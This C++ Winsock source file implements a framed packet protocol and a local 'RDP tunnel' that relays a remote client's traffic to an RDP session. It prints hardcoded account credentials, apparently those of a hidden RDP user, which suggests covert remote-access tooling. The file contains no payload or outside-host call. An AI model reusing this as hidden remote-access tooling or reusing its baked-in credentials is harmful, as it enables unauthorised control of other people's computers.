#include"net.h"
#include <WS2tcpip.h>
#include <iostream>
#include <random>

namespace net {

	BOOL init() {
		WSAData d;
		if (WSAStartup(MAKEWORD(2, 0), &d)) { return FALSE; }
		return TRUE;
	}
	int pktSend(SOCKET s, char* buff, int sz, char type) {
		if (send(s, (char*)&type, 1, 0) <= 0) { return -1; }
		if (send(s, (char*)&sz, 4, 0) <= 0) { return -1; }
		if (sz == 0 && buff == nullptr) { return 0; }
		if (send(s, buff, sz, 0) <= 0) { return -1; }

		return 0;
	}
	SOCKET SrvStart(unsigned short port) {
		SOCKADDR_IN inf;
		memset(&inf, 0, sizeof(inf));
		inet_pton(AF_INET, "0.0.0.0", &inf.sin_addr.s_addr);
		inf.sin_port = htons(port);
		inf.sin_family = AF_INET;

		SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
		if (bind(s, (sockaddr*)&inf, sizeof(inf))) { return SOCKET_ERROR; }
		if (listen(s, 100)) { return SOCKET_ERROR; }
		return s;
	}
	int recvit(SOCKET s, char* buffer, int count) {

		int tot = 0, rest, r;
		rest = count;
		while (tot < count) {
			r = recv(s, &buffer[tot], rest, 0);
			if (r == SOCKET_ERROR || r==0) { return -1; }
			tot += r;
			rest = count - tot;


		}


		return 0;
	}
	BOOL recvp(SOCKET s,char* buffer, int maxsz, _Out_ int* p_size) {
		*p_size = 0;
		int sz;
		if (recvit(s, buffer, 1) == SOCKET_ERROR) { return FALSE; }
		if (recvit(s, (char*)&sz, 4) == SOCKET_ERROR) { return FALSE; }
		if (sz > maxsz) { return FALSE; }
		if (recvit(s, &buffer[1], sz) == SOCKET_ERROR) { return FALSE; }

		*p_size = sz;
		return TRUE;
	}
	int sendall(SOCKET s, char* buf, int len)
	{
		int total = 0;        // how many bytes we've sent
		int bytesleft = len; // how many we have left to send
		int n = 0;

		while (total < len) {
			n = send(s, buf + total, bytesleft, 0);
			if (n == -1) { break; }
			total += n;
			bytesleft -= n;
		}

		len = total; // return number actually sent here

		return n == -1 ? -1 : 0; // return -1 on failure, 0 on success
	}
	

	int RDPTunnel(SOCKET client, SOCKET r) {
		fd_set fd;
		FD_ZERO(&fd);
		char buff[4096];
		int e;
		
		while (1) {
			FD_SET(r, &fd);
			FD_SET(client, &fd);
			select(1, &fd, NULL, NULL, NULL);
			if (FD_ISSET(r, &fd)) {

				e = recv(r, buff, sizeof(buff)-1, 0);
				
				if (e <= 0) {
					if (net::pktSend(client, nullptr, 0, 0x60) == SOCKET_ERROR) { return -1; }
					return 0;
				}
				else { 
				
					if (net::pktSend(client, buff, e, 0x50) == SOCKET_ERROR) { return -1; }


				}
			}
			if (FD_ISSET(client, &fd)) {
				int pack_sz;
				if (net::recvp(client, buff, sizeof(buff) - 1, &pack_sz) == FALSE) { 
					 return -1; 
				}
				send(r, &buff[1], pack_sz, 0);

			}



		}
		return 0;

	}
	int GenPort(int min, int max) {
		std::random_device rd;
		std::mt19937 gen(rd());
		std::uniform_int_distribution<> dis(min, max);
		return dis(gen);
	}
	void RDPServer(SOCKET client) {

		SOCKET srv;
		int port_tunnel;
		for (int i = 0; i <= 5; i++) {
			port_tunnel = GenPort(1024, 65535);
			srv = SrvStart(port_tunnel);
			if (srv != SOCKET_ERROR) { break; }
		}
		if (srv == SOCKET_ERROR) { std::cout << "Error starting server for RDP Tunnel\n"; return; }
		std::cout << "RDP tunnel started : 127.0.0.1:"<<port_tunnel<<" hrdpusr:pwd123456789!!\n";
		while (1) {
			SOCKET r = accept(srv, NULL, NULL);
			if (client == INVALID_SOCKET) {
				continue;
			}

			if (RDPTunnel(client, r) == 0) { closesocket(r); continue; }
			else {  closesocket(r); closesocket(client); return; }

		}

	}
}